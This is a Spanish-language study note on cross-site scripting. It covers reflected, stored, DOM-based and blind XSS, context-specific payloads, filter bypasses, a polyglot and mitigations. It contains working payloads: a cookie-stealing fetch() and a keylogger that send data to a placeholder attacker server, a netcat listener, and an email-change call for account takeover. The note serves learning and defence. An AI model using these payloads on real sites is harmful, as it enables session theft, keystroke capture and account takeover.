# XSS — Cross-Site Scripting

Relacionado: [[CSRF-Cross-Site-Request-Forgery]] · [[Reconocimiento-Manual-Web-y-DevTools]] · [[HTTP-Peticiones-y-Respuestas]] · [[OWASP-Top-10-2025]] · [[Herramientas-Burp-Suite-Decoder-Comparer-Sequencer]]

## Qué es
XSS ocurre cuando una aplicación acepta input del usuario y lo muestra en la página **sin escaparlo correctamente** — el navegador termina interpretando ese input como código HTML/JavaScript ejecutable, no como texto plano. El JavaScript inyectado corre con los mismos privilegios que el JS legítimo de la página: puede leer/modificar el DOM, hacer peticiones de red, y acceder a cookies (si no están protegidas).

## Terminología base
- **DOM (Document Object Model)**: representación en memoria de la página como árbol de elementos — lo que JS puede leer y modificar en tiempo real. Cuando JS actualiza el DOM, la página visible cambia de inmediato.
- **Parámetros de URL** (`?q=valor`): datos controlados por el usuario (se pueden escribir en la barra de direcciones o mandar por un link/formulario) — **siempre input no confiable**.
- **Cookies**: guardan datos pequeños en el navegador (IDs de sesión, preferencias). Si son legibles por JS y hay XSS, se pueden robar y secuestrar la sesión. La flag **`HttpOnly`** bloquea la lectura desde JS (defensa real contra este vector específico — ver [[Reconocimiento-Manual-Web-y-DevTools]]).
- **Escaping (output encoding)**: transforma el dato del usuario para que el navegador lo trate como texto plano, no como código (`<` → `&lt;`) — es la **defensa real**.
- **Filtrado/validación de input**: solo revisa que el input "se vea permitido" (letras, números, longitud) — **no evita** que el dato se vuelva código si después se inserta mal en la página. Filtrar y escapar son cosas distintas; solo escapar cierra el hueco de verdad.

## Anatomía de un payload
Todo payload de XSS tiene dos partes:
- **Intención**: qué se quiere lograr — demostrar la vulnerabilidad, robar cookies, capturar teclas, abusar de una función de la app.
- **Adaptación al contexto**: cómo se necesita ajustar el payload según **dónde exactamente** se refleja el input en la página (dentro de un tag HTML normal, dentro de un atributo, dentro de un bloque `<script>` ya existente, etc.). Rara vez el mismo payload funciona igual en dos aplicaciones distintas — hay que mirar cómo se refleja el input antes de craftear el payload final.

### Payload de prueba universal
```html
<script>alert('XSS')</script>
```
Si el navegador ejecuta el script y aparece el popup, confirma que hay ejecución real de JavaScript — es el payload de PoC (proof of concept) estándar: visualmente innegable, sin causar daño, ideal para reportar un hallazgo sin explotarlo de verdad.

## Los 4 tipos de XSS

### Reflected (reflejado)
La app toma un input (query string, campo de formulario, header) y lo devuelve **inmediatamente** en la respuesta, sin sanitizar. El atacante manda un link armado a la víctima; al hacer clic, el navegador ejecuta el script en el contexto del sitio legítimo. Requiere que la víctima interactúe con un link/página específica cada vez — el ataque no persiste.
```
https://sitio.com/search?q=<script>alert(1)</script>
```
**Causa raíz típica**: el backend toma el parámetro crudo y lo pasa directo al template sin escapar (ej. en Flask, usar la versión sin `escape()` en vez de la ya escapada que sí se generó).

### Stored (almacenado)
El input malicioso queda **guardado del lado del servidor** (base de datos, típicamente) y se sirve después a **cualquier** visitante sin escapar — más peligroso que Reflected porque el payload persiste y afecta a muchos usuarios (incluyendo administradores) con el tiempo, sin que el atacante tenga que mandar ningún link. Típico en comentarios, biografías de perfil, mensajes, reseñas, metadata de archivos subidos.
```html
<script>alert('stored')</script>
```
Insertado una sola vez en un campo de comentario/perfil — se ejecuta contra **cada** usuario que después visite esa página.

### DOM-based
El JavaScript **del lado del cliente** (ya cargado en la página) lee datos controlables por el atacante directo del DOM (`location.hash`, `location.search`, `document.referrer`, `localStorage`) y los escribe de vuelta en la página de forma insegura (`innerHTML`, `document.write`, `eval`). **El payload nunca toca el servidor** — el DOM del propio navegador es toda la superficie de ataque.
```html
<img src=x onerror="alert('dom-xss')">
```
Insertado en un campo que el JS del cliente inserta luego vía `innerHTML` — el navegador intenta cargar la imagen inexistente (`src=x`), falla, dispara `onerror`, y ejecuta el JS.

> **Por qué las defensas del servidor no ayudan aquí:** el dato nunca sale del navegador de la víctima — el backend puede estar perfectamente asegurado (WAF, escaping en servidor, todo bien) y el bug sigue existiendo igual, porque el fallo está en cómo el JS del **cliente** maneja los datos, no en el servidor. Hay que sanitizar también en el JS del front-end (nunca insertar input crudo con `innerHTML`; usar `textContent` o sanitizadores dedicados como DOMPurify).

### Blind (variante de Stored)
El payload también queda guardado permanentemente, pero **nunca se ve el resultado directamente** — se ejecuta en un panel privado que solo ve otro usuario (staff, admin, soporte). Típico en formularios de contacto/tickets de soporte que un empleado revisa después en un portal interno.

**Requisito clave**: el payload debe incluir un **callback** (normalmente una petición HTTP saliente) para enterarse de si y cuándo se ejecutó — sin eso, no hay forma de confirmar el hallazgo.

## Robo de sesión — extraer cookies vía XSS
```html
<script>fetch('https://SERVIDOR-PROPIO/steal?cookie=' + btoa(document.cookie));</script>
```
`document.cookie`: propiedad del DOM que expone como string todas las cookies del sitio actual accesibles por JS — solo funciona si ninguna trae `HttpOnly` · `btoa()`: codifica el valor en Base64 para que viaje seguro como parte de una URL (sin caracteres especiales que rompan el query string) · `fetch(url)`: dispara la petición HTTP hacia el servidor propio, exfiltrando el dato robado sin que la víctima note nada.

**Levantar el listener para recibir la exfiltración (netcat):**
```bash
nc -nlvp 9001
```
`-l`: modo escucha (listen) · `-n`: no resuelve hostnames vía DNS (evita delays innecesarios) · `-v`: modo verbose, para ver la conexión entrante · `-p 9001`: puerto donde escuchar.

Cuando la víctima ejecuta el payload, el `fetch()` llega crudo al listener — netcat no es un servidor HTTP real, solo imprime el texto tal cual, incluyendo la query string con la cookie en Base64.

**Decodificar la cookie capturada:**
```bash
echo "VALOR_CAPTURADO_DESPUES_DE_cookie=" | base64 -d
```
`base64 -d`: decodifica de vuelta a texto plano — o usar Burp Decoder (ver [[Herramientas-Burp-Suite-Decoder-Comparer-Sequencer]]) para el mismo resultado con interfaz gráfica.

## Keylogger — capturar todo lo que teclea la víctima
```html
<script>
document.onkeypress = function(e) {
  fetch('https://SERVIDOR-PROPIO/log?key=' + btoa(e.key));
}
</script>
```
`document.onkeypress`: engancha un handler que corre en cada tecla presionada mientras la página esté abierta · `e.key`: el carácter específico presionado · cada tecla se manda individualmente al servidor propio — con suficiente tiempo, esto reconstruye contraseñas, mensajes, cualquier cosa que la víctima escriba en esa página.

## Abuso de lógica de negocio
Si la app expone funciones JS propias reutilizables desde el contexto de página (ej. `user.changeEmail()`), un XSS exitoso puede invocarlas directamente:
```html
<script>user.changeEmail('atacante@dominio-malo.com');</script>
```
Con el email de la cuenta ya bajo control del atacante, el siguiente paso natural es un reset de contraseña — apropiación completa de la cuenta sin haber robado ninguna credencial.

## Adaptar el payload al contexto de reflexión
Cada aplicación refleja el input en un lugar distinto del HTML — el payload tiene que "escapar" ese contexto específico antes de poder ejecutar JS.

### Directo en el cuerpo HTML
Si el input se inserta tal cual entre tags (`<p>NOMBRE</p>`), el payload básico funciona sin adaptación:
```html
<script>alert('XSS')</script>
```

### Dentro de un atributo (`value="..."`)
Si el input cae dentro de un atributo de un tag ya abierto (ej. `<input value="NOMBRE">`), un `<script>` normal no sirve — primero hay que **cerrar el atributo y el tag**:
```html
"><script>alert('XSS')</script>
```
`">` cierra la comilla del atributo `value` y cierra el tag `<input>` — a partir de ahí, el `<script>` queda en el cuerpo HTML normal y se ejecuta.

### Dentro de un `<textarea>`
El contenido de un `<textarea>` se trata como texto plano hasta que se cierra la etiqueta — hay que cerrarla explícitamente antes del payload:
```html
</textarea><script>alert('XSS')</script>
```

### Dentro de un string de JavaScript ya existente
Si el input cae dentro de código JS que el sitio ya tiene (ej. `var name = 'NOMBRE';`), no hace falta abrir un `<script>` nuevo — hay que **cerrar el string y la sentencia actual**, inyectar la propia, y comentar el resto para no romper la sintaxis que sigue:
```javascript
';alert('XSS');//
```
`'` cierra la comilla que envuelve el input original · `;` termina la sentencia actual · `alert('XSS');` es el código inyectado, como sentencia nueva e independiente · `//` convierte todo lo que sigue en comentario, para que el resto del código original (comillas/punto y coma que el dev ya tenía puestos después) no rompa la sintaxis y genere un error.

### Bypass de filtro de palabras (ej. se elimina "script")
Si un filtro quita la palabra `script` de cualquier parte del input (sin importar el contexto), duplicar la palabra alrededor del punto de corte deja el resultado limpio después del filtrado:
```
<sscriptcript>alert('XSS')</sscriptcript>
```
El filtro busca y elimina la substring `script` — al quitarla de `sscriptcript`, sobra exactamente `script`, reconstruyendo el tag válido sin que el filtro lo detecte en su forma final.

### Bypass de filtro de caracteres (`<` y `>` eliminados)
Si el filtro elimina directamente los caracteres `<`/`>`, no se puede abrir ningún tag nuevo — la alternativa es aprovechar un **atributo de evento** de un tag que **ya existe** en la página (ej. una imagen), sin necesitar esos caracteres en absoluto:
```
/ruta/imagen.jpg" onload="alert('XSS')
```
Se completa el valor esperado del atributo `src` con una ruta razonable, se cierra esa comilla con `"`, y se abre un atributo `onload="..."` nuevo — el navegador ejecuta ese JS automáticamente en cuanto la imagen termina de cargar (o `onerror` si se fuerza a que falle la carga, como en el ejemplo DOM-based de arriba). Cero `<`/`>` usados.

### Polyglot — un payload que cubre varios contextos a la vez
Un polyglot combina múltiples técnicas de escape simultáneamente, para funcionar sin adaptación en distintos contextos de reflexión (HTML body, atributo, JS string, con o sin filtros de caracteres):
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
```
Útil como primer intento rápido contra un punto de inyección desconocido, antes de invertir tiempo analizando el contexto exacto — si funciona, ahorra todo el proceso de adaptación manual.

## Herramientas para Blind XSS
- **XSS Hunter Express**: captura automáticamente cookies, URL, contenido de la página y más en cuanto el payload se ejecuta — evita tener que montar un listener/servidor propio a mano para cada campo capturado.
- Alternativa manual: listener de netcat (visto arriba) + payload con `fetch()` — funciona igual, solo hay que decodificar Base64 a mano después.

## XSS vs CSRF — quién hace qué
| | CSRF | XSS |
|---|---|---|
| **Qué se ejecuta** | Nada de JS del atacante corre en el sitio legítimo — solo se dispara una petición HTTP normal | JavaScript del atacante sí corre dentro del contexto del sitio legítimo |
| **Qué puede hacer** | Solo disparar acciones (cambiar algo, mandar un form) — no puede leer la respuesta | Leer cookies, leer el DOM, robar datos, lo que sea que JS pueda hacer |
| **Qué lo detiene** | Un token CSRF impredecible (ver [[CSRF-Cross-Site-Request-Forgery]]) | Escapar correctamente el output para que el navegador nunca trate el input como código |
| **Analogía** | Falsificar una firma en un cheque ya llenado | Meterse físicamente a la cuenta y hacer lo que se quiera mientras se está ahí |

XSS es generalmente más peligroso: con Stored/Blind XSS ni siquiera hace falta el paso de "convencer a la víctima de visitar una página externa" — el ataque vive dentro del sitio en el que ella ya confía.

## Mitigación
- **Escaping estructural de output** (la defensa real): convertir siempre `<`, `>`, `"`, `'`, `&` a sus entidades HTML antes de insertar cualquier input en la página — la mayoría de frameworks modernos lo hacen automático por default (ej. Jinja2/Flask, React) salvo que el dev lo desactive explícitamente (`|safe` en Jinja2, `dangerouslySetInnerHTML` en React).
- **Nunca usar `innerHTML`/`document.write`/`eval` con datos no confiables** en JS de cliente — usar `textContent`, o un sanitizador dedicado (DOMPurify) si de verdad hace falta insertar HTML.
- **Content-Security-Policy (CSP)**: header que restringe desde dónde puede cargar/ejecutar scripts la página — mitiga el impacto incluso si un XSS se cuela.
- **Cookies `HttpOnly`**: bloquea la lectura de la cookie de sesión desde JS — no previene el XSS en sí, pero neutraliza el vector de robo de sesión específicamente (ver [[Reconocimiento-Manual-Web-y-DevTools]]).
- **Input validation** (filtrado): útil como capa complementaria, nunca como única defensa — un filtro de palabras/caracteres siempre es evadible (ver técnicas de bypass arriba).
